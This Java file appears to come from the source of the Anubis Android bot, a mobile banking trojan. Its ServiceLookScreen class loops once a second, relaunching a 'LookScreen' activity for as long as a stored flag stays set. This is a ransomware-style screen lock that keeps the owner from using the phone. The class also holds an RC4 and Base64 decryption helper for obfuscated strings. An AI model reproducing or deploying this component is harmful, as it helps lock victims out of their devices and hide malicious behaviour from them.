package anubis.bot.myapplication;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.util.Base64;

import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.Activity.LookScreen;


public class ServiceLookScreen extends IntentService {
    UtilsClass utl = new UtilsClass();
    public ServiceLookScreen() {
        super("ServiceLookScreen");
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onHandleIntent(Intent intent) {
       while(true){
           try {
               TimeUnit.MILLISECONDS.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}

          try{
              startActivity(new Intent(this, LookScreen.class));
              if(!utl.SetRead(this, "lookscreen").equals("true"))break;
          }catch (Exception ex){
              utl.Log("ERROR","LookScreen");
          }
       }
    }

}
